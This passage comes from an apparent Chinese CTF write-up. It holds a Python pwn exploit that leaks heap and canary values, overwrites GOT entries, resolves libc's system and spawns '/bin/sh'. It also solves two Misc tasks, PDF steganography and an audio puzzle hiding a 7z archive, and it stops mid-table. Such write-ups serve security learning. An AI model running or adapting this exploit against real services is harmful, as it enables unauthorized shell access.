&nbsp;
def&nbsp;sub_quit(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;7&quot;)
&nbsp;
def&nbsp;pwn(io):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;8&quot;]&nbsp;*&nbsp;16
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#sub_update(io,&nbsp;9,&nbsp;0x7ffffff0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_query(io,&nbsp;16)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;[*L*]&nbsp;Query&nbsp;result:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read_until(&quot;\n&quot;)[:-1]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;heap_addr&nbsp;=&nbsp;int(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data_buff&nbsp;=&nbsp;heap_addr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;data_buff:&quot;,&nbsp;hex(data_buff)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#prepare
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clear(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rand_val_addr&nbsp;=&nbsp;0x0804C04C
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;2,&nbsp;rand_val_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;history(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;[*L*]&nbsp;ID&nbsp;=&nbsp;0&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Len&nbsp;=&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;int(io.read_until(&quot;,&nbsp;Data&quot;)[:-6])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rand_val_addr&nbsp;=&nbsp;struct.unpack(&quot;I&quot;,&nbsp;struct.pack(&quot;i&quot;,&nbsp;data))[0]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;rand_val_addr:&quot;,&nbsp;hex(rand_val_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;canary:&quot;,&nbsp;hex(0xfffffffe&nbsp;^&nbsp;rand_val_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;canary&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;0xfffffffe&nbsp;^&nbsp;rand_val_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;0,&nbsp;-2&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;1,&nbsp;canary)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zero_area&nbsp;=&nbsp;data_buff&nbsp;+&nbsp;(22)&nbsp;*&nbsp;4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;6,&nbsp;zero_area)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;history(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.read_until(&quot;ID&nbsp;=&nbsp;1&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.read_until(&quot;Data&nbsp;=&nbsp;2&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#data&nbsp;=&nbsp;int(io.read_until(&quot;&nbsp;&quot;)[:-1])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#heap_addr&nbsp;=&nbsp;struct.unpack(&quot;I&quot;,&nbsp;struct.pack(&quot;i&quot;,&nbsp;data))[0]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;&quot;heap_addr:&quot;,&nbsp;hex(heap_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#data_buff&nbsp;=&nbsp;heap_addr&nbsp;-&nbsp;0x08
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;&quot;data_buff:&quot;,&nbsp;hex(data_buff)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&quot;1&quot;]&nbsp;*&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;8&nbsp;^&nbsp;rand_val_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;2,&nbsp;count)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t_reload(io,&nbsp;2)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.interact()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_query(io,&nbsp;100)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strtol_got&nbsp;=&nbsp;0x0804c01c
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts_got&nbsp;=&nbsp;0x0804c034
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;puts_got:&quot;,&nbsp;hex(puts_got)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global_addr&nbsp;=&nbsp;(data_buff&nbsp;&amp;&nbsp;0xfffff000)&nbsp;+&nbsp;0x100a0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;global_addr:&quot;,&nbsp;hex(global_addr)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff_index&nbsp;=&nbsp;(0x100a0&nbsp;-&nbsp;(0x048&nbsp;+&nbsp;8))&nbsp;/&nbsp;4
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;extern_addr&nbsp;=&nbsp;global_addr&nbsp;-&nbsp;0x500
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;other_addr&nbsp;=&nbsp;global_addr&nbsp;-&nbsp;0x400
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;other_index&nbsp;=&nbsp;diff_index&nbsp;-&nbsp;0x400&nbsp;/&nbsp;4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;extern_got&nbsp;=&nbsp;global_addr&nbsp;-&nbsp;0x550
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;0,&nbsp;0x8)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;1,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;2,&nbsp;extern_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;3,&nbsp;other_addr)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;0,&nbsp;0x8)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;1,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;2,&nbsp;extern_addr&nbsp;+&nbsp;0x08)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;3,&nbsp;other_addr&nbsp;+&nbsp;0x10)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;4,&nbsp;0x8)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;5,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;6,&nbsp;extern_addr&nbsp;+&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;7,&nbsp;other_addr&nbsp;+&nbsp;0x20)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;8,&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;9,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;10,&nbsp;puts_got&nbsp;-&nbsp;0xC)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;11,&nbsp;other_addr&nbsp;+&nbsp;0x30)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;12,&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;13,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;14,&nbsp;extern_got)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;15,&nbsp;other_addr&nbsp;+&nbsp;0x40)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;16,&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;17,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;18,&nbsp;strtol_got&nbsp;-&nbsp;0xC)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;other_index&nbsp;+&nbsp;19,&nbsp;0)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;12,&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;13,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;14,&nbsp;extern_got)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;15,&nbsp;global_addr&nbsp;+&nbsp;0x30)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;16,&nbsp;0x10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;17,&nbsp;0x0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;18,&nbsp;strtol_got&nbsp;-&nbsp;0xC)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;diff_index&nbsp;+&nbsp;19,&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&#39;1&#39;,&nbsp;&#39;%d&#39;%(0x08048776)]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#if&nbsp;diff&nbsp;&lt;&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t_exit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_query(io,&nbsp;2)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;[*L*]&nbsp;Query&nbsp;result:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;int(io.read_until(&quot;\n&quot;)[:-1])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts_addr&nbsp;=&nbsp;struct.unpack(&quot;I&quot;,&nbsp;struct.pack(&quot;i&quot;,&nbsp;data))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;puts_addr:&quot;,&nbsp;hex(puts_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#elf_info&nbsp;=&nbsp;ELF(&quot;./libc.so.6&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elf_info&nbsp;=&nbsp;ELF(&quot;./libc.so&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;hex(elf_info.symbols[&quot;puts&quot;])
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_addr&nbsp;=&nbsp;puts_addr&nbsp;-&nbsp;elf_info.symbols[&quot;puts&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;elf_info.symbols[&quot;system&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_getc_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;elf_info.symbols[&quot;_IO_getc&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malloc_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;elf_info.symbols[&quot;malloc&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#__printf_chk_addr&nbsp;=&nbsp;&nbsp;libc_addr&nbsp;+&nbsp;elf_info.symbols[&quot;__printf_chk&quot;]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malloc_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;malloc_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#__printf_chk_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;__printf_chk_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;malloc_addr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;puts_addr
&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;0,&nbsp;malloc_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#sub_update(io,&nbsp;1,&nbsp;puts_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;system&nbsp;addr:&quot;,&nbsp;hex(system_addr)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#system_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;system_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#io.interact()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seq&nbsp;=&nbsp;[&#39;1&#39;,&nbsp;&#39;1&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort(io,&nbsp;seq)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_sort(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_getc_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;_IO_getc_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_addr&nbsp;=&nbsp;struct.unpack(&quot;i&quot;,&nbsp;struct.pack(&quot;I&quot;,&nbsp;system_addr))[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;0,&nbsp;_IO_getc_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_update(io,&nbsp;1,&nbsp;system_addr)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#sub_update(io,&nbsp;2,&nbsp;system_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#sub_quit(io)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t_reload(io,&nbsp;0)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Choose:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&quot;/bin/sh&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True
&nbsp;
&nbsp;
io&nbsp;=&nbsp;get_io(target)
pwn(io)</pre><p><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">成功截图：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01f6227c0b86b9c9b6.png" title="t01d654d22c66547652.png" alt="http://p7.qhimg.com/t01d654d22c66547652.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">Misc</span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">10 Welcome</span></strong></p><p><br/></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">100&nbsp; Speed Data</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">PDF隐写&nbsp; 直接二进制查看或者用工具都可以</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">工具是 wbStego4open&nbsp; 直接decode就可以得到flag</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t012e213fb3b317bab8.png" title="t018ba8a446a8c74f7b.png" alt="http://p6.qhimg.com/t018ba8a446a8c74f7b.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><h3><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">200&nbsp; Puzzle</span></h3><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">音频中间某处有个字符串：</span></p><table cellspacing="0" cellpadding="0"><tbody><tr class="firstRow"><td width="553" valign="top" style="border-color: windowtext; border-width: 1px; padding: 0px 7px;"><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">1L0vey0u*.*me</span></p></td></tr></tbody></table><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">音频最后有奇怪的数据：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0198471110b56397db.png" title="t01f4ab1e0b0ee97921.png" alt="http://p0.qhimg.com/t01f4ab1e0b0ee97921.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">明显的7z，不过每两个字符中间加了00，写个脚本解一下得到一个7z：</span></p><p><br/></p><pre class="brush:python;toolbar:false">r=open(&quot;fg&quot;,&quot;rb&quot;)
&nbsp;&nbsp;rr=r.read()
&nbsp;&nbsp;
&nbsp;&nbsp;s=[]
&nbsp;&nbsp;i=1
&nbsp;&nbsp;while&nbsp;i&nbsp;&lt;len(rr):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.append(rr[i])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i+=2
&nbsp;&nbsp;
&nbsp;&nbsp;w=open(&quot;fss.7z&quot;,&quot;wb&quot;)
&nbsp;&nbsp;w.write(&quot;&quot;.join(s))</pre><p style="text-align:center"><img src="http://p1.qhimg.com/t01e26fb6190c36d31a.png" title="t012d7917e5f035ba97.png" alt="http://p4.qhimg.com/t012d7917e5f035ba97.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">用刚才那个字符串作为密码可以打开7z：</span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">不明觉厉，看图片的二维码，有：</span></p><table cellspacing="0" cellpadding="0"><tbody><tr class="firstRow"><td width="553" valign="top" style="border-color: windowtext; border-width: 1px; padding: 0px 7px;"><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># flag = f[root]</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># f[x] = d[x] xor max(f[lson(x)], &nbsp; f[rson(x)])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : x isn&#39;t &nbsp; 